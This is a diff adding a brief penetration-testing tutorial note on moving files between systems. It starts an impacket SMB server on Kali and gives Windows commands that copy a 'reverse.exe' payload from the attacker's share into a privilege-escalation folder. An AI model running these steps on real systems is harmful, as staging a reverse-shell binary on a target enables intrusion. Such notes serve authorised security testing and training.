@@ -1,0 +1,16 @@
+
+--  Transfer Files Between Systems --
+
+This post covers the number of ways to transfer file between systems. These techniques helps penetration testers during the different situations, so bookmark this page and keep following hackingDNA.
+
+CASE I: Transfer file using SMB Server 
+
+Start SMB Server on Kali Linux 
+kali@kali:~$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
+
+Windows Machine
+C:Users\user>copy \\kali-ip\kali\reverse.exe C:\PrivEsc\reverse.exe
+C:Users\user>copy \\10.11.9.145\kali\reverse.exe C:\PrivEsc\reverse.exe
+
+
+Soon covers more techniques, regularly view this page for new techniques.
